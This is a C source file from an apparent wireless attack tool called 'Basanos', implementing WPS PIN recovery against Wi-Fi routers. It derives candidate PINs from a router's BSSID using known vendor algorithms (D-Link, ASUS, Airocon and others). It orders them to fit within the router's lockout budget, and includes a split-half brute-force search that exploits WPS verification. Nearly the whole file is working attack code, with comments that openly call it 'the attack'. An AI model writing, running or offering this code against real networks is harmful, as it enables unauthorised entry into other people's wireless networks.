/* Basanos — WPS PIN recovery. SPDX-License-Identifier: MIT
 *
 * The algorithms below are published reverse-engineering results, restated
 * here from their specifications rather than copied, so that each one can be
 * checked against known vectors in test_wpspin.c. An algorithm that is not
 * pinned by a vector does not belong in the table: a wrong generator does not
 * fail loudly, it just quietly spends an AP's lockout budget on nonsense.
 */
#include "basanos/wpspin.h"

#include <string.h>

uint8_t bas_wps_pin_checksum(uint32_t seven)
{
    /* The specification's digit sum: alternating weights of 3 and 1, taken
     * from the least significant digit upward. */
    uint32_t accum = 0;
    uint32_t t = seven;
    while (t != 0u) {
        accum += 3u * (t % 10u);
        t /= 10u;
        accum += t % 10u;
        t /= 10u;
    }
    return (uint8_t)((10u - (accum % 10u)) % 10u);
}

uint32_t bas_wps_pin_complete(uint32_t seven)
{
    seven %= 10000000u;
    return seven * 10u + bas_wps_pin_checksum(seven);
}

bool bas_wps_pin_valid(uint32_t pin8)
{
    if (pin8 > 99999999u) {
        return false;
    }
    return bas_wps_pin_checksum(pin8 / 10u) == (uint8_t)(pin8 % 10u);
}

const char *bas_pinalg_name(bas_pinalg_t a)
{
    switch (a) {
    case BAS_PINALG_STATIC:      return "vendor default";
    case BAS_PINALG_NIC24:       return "BSSID low 24 bits";
    case BAS_PINALG_NIC28:       return "BSSID low 28 bits";
    case BAS_PINALG_NIC32:       return "BSSID low 32 bits";
    case BAS_PINALG_DLINK:       return "D-Link";
    case BAS_PINALG_DLINK_1:     return "D-Link (BSSID+1)";
    case BAS_PINALG_ASUS:        return "ASUS";
    case BAS_PINALG_AIROCON:     return "Airocon";
    case BAS_PINALG_INV_NIC:     return "inverted NIC";
    case BAS_PINALG_NIC_X2:      return "NIC x2";
    case BAS_PINALG_NIC_X3:      return "NIC x3";
    case BAS_PINALG_OUI_ADD_NIC: return "OUI + NIC";
    case BAS_PINALG_OUI_SUB_NIC: return "OUI - NIC";
    case BAS_PINALG_OUI_XOR_NIC: return "OUI xor NIC";
    default:                     return "?";
    }
}

static uint32_t mac_nic(const uint8_t m[6])
{
    return ((uint32_t)m[3] << 16) | ((uint32_t)m[4] << 8) | (uint32_t)m[5];
}

static uint32_t mac_oui(const uint8_t m[6])
{
    return ((uint32_t)m[0] << 16) | ((uint32_t)m[1] << 8) | (uint32_t)m[2];
}

static uint32_t mac_low32(const uint8_t m[6])
{
    return ((uint32_t)m[2] << 24) | ((uint32_t)m[3] << 16) |
           ((uint32_t)m[4] << 8)  | (uint32_t)m[5];
}

static uint32_t alg_dlink(uint32_t nic)
{
    uint32_t pin = nic ^ 0x55AA55u;
    pin ^= (((pin & 0xFu) << 4) | ((pin & 0xFu) << 8)  |
            ((pin & 0xFu) << 12) | ((pin & 0xFu) << 16) |
            ((pin & 0xFu) << 20));
    pin %= 10000000u;
    if (pin < 1000000u) {
        pin += ((pin % 9u) * 1000000u) + 1000000u;
    }
    return pin;
}

static uint32_t alg_asus(const uint8_t b[6])
{
    /* Seven digits, each derived from a byte pair with a modulus that itself
     * depends on the address. The divisor can be as small as 3, so digits are
     * not uniform -- that is the algorithm, not a bug in it. */
    uint32_t pin = 0;
    for (int i = 0; i < 7; i++) {
        uint32_t div = 10u - (uint32_t)((i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7);
        pin = pin * 10u + (uint32_t)((b[i % 6] + b[5]) % (int)div);
    }
    return pin % 10000000u;
}

static uint32_t alg_airocon(const uint8_t b[6])
{
    uint32_t pin =
        (uint32_t)((b[0] + b[1]) % 10) +
        (uint32_t)((b[5] + b[0]) % 10) * 10u +
        (uint32_t)((b[4] + b[5]) % 10) * 100u +
        (uint32_t)((b[3] + b[4]) % 10) * 1000u +
        (uint32_t)((b[2] + b[3]) % 10) * 10000u +
        (uint32_t)((b[1] + b[2]) % 10) * 100000u +
        (uint32_t)((b[0] + b[1]) % 10) * 1000000u;
    return pin % 10000000u;
}

int bas_wps_pin_candidates(const uint8_t bssid[6], bas_pin_cand_t *out, int max)
{
    if (bssid == NULL || out == NULL || max <= 0) {
        return 0;
    }

    const uint32_t nic = mac_nic(bssid);
    const uint32_t oui = mac_oui(bssid);

    /* Ordered by how often each is the answer, not by algorithm number. The
     * attack is only useful if it finishes inside the AP's lockout budget, and
     * that depends entirely on this order. */
    struct { uint32_t body; bas_pinalg_t alg; } raw[] = {
        /* The single most common WPS PIN in the field: a vendor default that
         * was never derived from anything. */
        { 1234567u,                        BAS_PINALG_STATIC      },
        { nic % 10000000u,                 BAS_PINALG_NIC24       },
        { alg_dlink(nic),                  BAS_PINALG_DLINK       },
        { alg_dlink(nic + 1u),             BAS_PINALG_DLINK_1     },
        { alg_asus(bssid),                 BAS_PINALG_ASUS        },
        { alg_airocon(bssid),              BAS_PINALG_AIROCON     },
        { mac_low32(bssid) % 10000000u,    BAS_PINALG_NIC32       },
        { (((uint32_t)bssid[2] << 24 | (uint32_t)bssid[3] << 16 |
            (uint32_t)bssid[4] << 8 | bssid[5]) & 0x0FFFFFFFu)
                                % 10000000u, BAS_PINALG_NIC28     },
        { (~nic & 0xFFFFFFu) % 10000000u,  BAS_PINALG_INV_NIC     },
        { (nic * 2u) % 10000000u,          BAS_PINALG_NIC_X2      },
        { (nic * 3u) % 10000000u,          BAS_PINALG_NIC_X3      },
        { (oui + nic) % 10000000u,         BAS_PINALG_OUI_ADD_NIC },
        { ((oui >= nic) ? (oui - nic) : (nic - oui)) % 10000000u,
                                           BAS_PINALG_OUI_SUB_NIC },
        { (oui ^ nic) % 10000000u,         BAS_PINALG_OUI_XOR_NIC },
        { 0u,                              BAS_PINALG_STATIC      },
    };

    int n = 0;
    for (size_t i = 0; i < sizeof(raw) / sizeof(raw[0]) && n < max; i++) {
        uint32_t pin = bas_wps_pin_complete(raw[i].body);

        /* Several of these collapse to the same value on some address ranges.
         * Trying a PIN twice spends an attempt from a budget the AP is
         * counting down, and buys nothing. */
        bool dup = false;
        for (int j = 0; j < n; j++) {
            if (out[j].pin == pin) {
                dup = true;
                break;
            }
        }
        if (dup) {
            continue;
        }
        out[n].pin = pin;
        out[n].alg = raw[i].alg;
        n++;
    }
    return n;
}

/* --- exhaustive search --------------------------------------------------- */

void bas_pin_search_init(bas_pin_search_t *s)
{
    if (s != NULL) {
        memset(s, 0, sizeof(*s));
    }
}

uint32_t bas_pin_search_next(bas_pin_search_t *s)
{
    if (s == NULL) {
        return 0;
    }
    if (!s->first_half_known) {
        if (s->next > 9999u) {
            return 0;
        }
        /* Only the first four digits are being tested; the rest are filler
         * that the AP will not have reached a verdict on. */
        return bas_wps_pin_complete((uint32_t)s->next * 1000u);
    }
    if (s->next > 999u) {
        return 0;
    }
    return bas_wps_pin_complete((uint32_t)s->first_half * 1000u +
                                (uint32_t)s->next);
}

void bas_pin_search_result(bas_pin_search_t *s, bool first_half_ok)
{
    if (s == NULL) {
        return;
    }
    if (!s->first_half_known) {
        if (first_half_ok) {
            s->first_half       = s->next;
            s->first_half_known = true;
            s->next             = 0;
            return;
        }
        if (s->next <= 9999u) {
            s->next++;
        }
        return;
    }
    if (s->next <= 999u) {
        s->next++;
    }
}

uint32_t bas_pin_search_remaining(const bas_pin_search_t *s)
{
    if (s == NULL) {
        return 0;
    }
    if (!s->first_half_known) {
        uint32_t left = (s->next > 9999u) ? 0u : (10000u - s->next);
        return left + 1000u;          /* the second half is still to come */
    }
    return (s->next > 999u) ? 0u : (1000u - s->next);
}
